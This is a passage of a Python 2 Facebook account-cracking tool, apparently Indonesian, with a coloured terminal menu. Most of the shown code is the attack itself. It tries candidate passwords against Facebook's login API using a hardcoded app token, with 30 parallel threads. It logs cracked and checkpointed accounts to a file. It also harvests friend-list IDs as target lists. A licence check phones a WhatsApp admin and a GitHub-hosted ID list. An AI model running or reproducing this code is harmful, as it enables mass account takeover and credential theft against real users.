                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass8 + ' > ' + b['name']
                                            cek = open('avs/fb.txt', 'a')
                                            cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass9 + ' > ' + b['name']
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass9 + ' > ' + b['name']
                                                cek = open('avs/fb.txt', 'a')
                                                cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + pass10 + ' > ' + b['name']
                                                    oks.append(user + pass10)
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + pass10 + ' > ' + b['name']
                                                    cek = open('avs/fb.txt', 'a')
                                                    cek.write('[+] Nama     : ' + b['name'] + '\n[+] User     : ' + user + '\n[+] Password : ' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avs/fb.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


def dump():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m] Dump ID From FriendsList'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m] Dump ID From Public ID'
    print '\x1b[1;97m[\x1b[1;92m00\x1b[1;97m] Back To Menu'
    print 50 * '\x1b[1;94m-'
    pilih_dump()


def pilih_dump():
    peak = raw_input('\x1b[1;97manggaxd/\x1b[1;91m> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_toket()
    elif peak == '1' or peak == '01':
        id_teman()
    elif peak == '2' or peak == '02':
        id_dariteman()
    elif peak == '0' or peak == '00':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_dump()


def id_teman():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    try:
        os.mkdir('avs')
    except OSError:
        pass

    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    z = json.loads(r.text)
    print putih + '[' + lime + '+' + putih + '] Fetching ID All Friend ...' + putih
    save = open('avs/id_teman.txt', 'w')
    for y in z['data']:
        idfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print putih + '\r[' + lime + '+' + putih + '] Total IDs : ' + lime + str(len(idfriend)),
        save.flush()
        time.sleep(0.0001)

    save.close()
    print putih + '\n[' + lime + '+' + putih + '] Successfully Get ID Friend'
    done = raw_input(putih + '[' + lime + '+' + putih + '] Save File With Name : ' + lime)
    print putih + '[' + lime + '+' + putih + '] Create File ...'
    time.sleep(2)
    os.rename('avs/id_teman.txt', 'avs/' + done)
    print putih + '[' + lime + '+' + putih + '] File Saved : ' + lime + 'avs/' + done + putih
    print putih + '[' + lime + '+' + putih + '] Done ^_^'
    raw_input(putih + '\nEnter Go Back To Menu')
    menu()


def id_dariteman():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    try:
        os.mkdir('avs')
    except OSError:
        pass

    idt = raw_input(putih + '[' + lime + '+' + putih + '] Input ID Public : ' + lime)
    try:
        a = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        f = json.loads(a.text)
        print putih + '[' + blue + '\xe2\x9c\x93' + putih + '] Get ID From : ' + lime + f['name']
    except KeyError:
        print putih + '[' + merah + '!' + putih + '] Not Found'
        raw_input(putih + '\nEnter Go Back Menu')
        menu()

    r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
    z = json.loads(r.text)
    print putih + '[' + lime + '+' + putih + '] Fetching ID All Friend From ' + lime + f['name'] + putih
    save = open('avs/id_temandariteman.txt', 'w')
    for y in z['friends']['data']:
        idfromfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print putih + '\r[' + lime + '+' + putih + '] Total IDs : ' + lime + str(len(idfromfriend)),
        save.flush()
        time.sleep(0.0001)

    save.close()
    print putih + '\n[' + lime + '+' + putih + '] Successfully Get ID Friend From ' + lime + f['name'] + putih
    done = raw_input(putih + '[' + lime + '+' + putih + '] Save File With Name : ' + lime)
    print putih + '[' + lime + '+' + putih + '] Create File ...'
    time.sleep(2)
    os.rename('avs/id_temandariteman.txt', 'avs/' + done)
    print putih + '[' + lime + '+' + putih + '] File Saved : ' + lime + 'avs/' + done + putih
    print putih + '[' + lime + '+' + putih + '] Done ^_^'
    raw_input(putih + '\nEnter Go Back To Menu')
    menu()


def findid():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    try:
        url = raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Link Profile : ')
        r = requests.get(url).text
        name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
        id = re.search('profile/(.*?)" ', r).group(1)
        print '\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Name User : ' + name
        print '\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] User ID   : ' + id
        raw_input(putih + '\nEnter Go Back Menu')
        menu()
    except requests.exceptions.ConnectionError:
        print putih + '[' + merah + '!' + putih + '] No Connection'
        menu()
    except AttributeError:
        print putih + '[' + merah + '!' + putih + '] Username Not Found'

    raw_input(putih + '\nEnter Go Back Menu')
    menu()


def updatetools():
    os.system('clear')
    os.system('git pull')


def spt():
    try:
        toket = open('toket.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] License Invalid !'
        os.system('clear')
        os.system('rm -rf toket.txt')
        user()

    if os.path.exists('toket.txt'):
        user1()
    else:
        user()


def user():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m-'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Generating ID ...'
    time.sleep(3)
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ID Generating Success'
    id = uuid.uuid4().hex[:20]
    idg = open('toket.txt', 'w')
    idg.write(id)
    idg.close()
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] ID : \x1b[92m' + id
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Successfully'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Your ID Has Not Been Confirmed'
    print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] Please Contact Admin for ID Confirmation'
    raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Press Enter to Chat Admin')
    os.system('am start https://wa.me/6281221608938?text=Konfirmasi%20Saya%20Dengan%20ID:%20' + id + ' >/dev/null')
    time.sleep(1)
    keluar()


def user1():
    try:
        j = open('toket.txt', 'r').read()
        r = requests.get('https://raw.githubusercontent.com/toketid/server/main/id.txt').text
        if j in r:
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m-'
            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Login Status\x1b[1;91m :\x1b[1;92m Complete'
            masuk()
        else:
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m-'
            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Login Status : \x1b[1;91mFailed\x1b[1;39m'
            print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] ID Not Confirmed\x1b[1;39m'
            print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] Please Chat Admin For Confirmed Your ID\x1b[1;39m'
            raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Press Enter To Chat Admin\x1b[1;39m')
            os.system('am start https://wa.me/6281221608938?text=Tolong%20konfirmasi%20saya%20dengan%20ID:%20' + j + ' >/dev/null')
            keluar()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'
        raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Back')
        spt()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'toket.txt'])
        user()


if __name__ == '__main__':
    os.system('git pull')
    masuk()
# Awokawokawok Ngerekod:v
